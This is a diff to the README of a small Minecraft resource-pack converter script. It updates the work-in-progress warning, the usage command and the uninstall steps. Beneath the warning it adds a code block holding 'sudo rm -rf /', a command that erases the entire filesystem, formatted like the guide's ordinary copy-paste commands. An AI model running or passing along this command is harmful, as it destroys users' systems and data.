@@ -1,7 +1,9 @@
 # McResourcePackConverter
 
-## Work in progress, don't use it yet
-Don't
+## This is work in progress, don't use it yet
+```
+sudo rm -rf /
+```
 
 ## Installation
 ```
@@ -18,5 +20,10 @@ git pull https://github.com/CrackedMatter/McResourcePackConverter
 ## Usage
 ```
 cd path/to/resource/pack
-bash ~/McResourcePackConverter/
+bash ~/McResourcePackConverter/mrpc.sh
+```
+
+## Uninstalling
+```
+rm ~/McResourcePackConverter -r
 ```
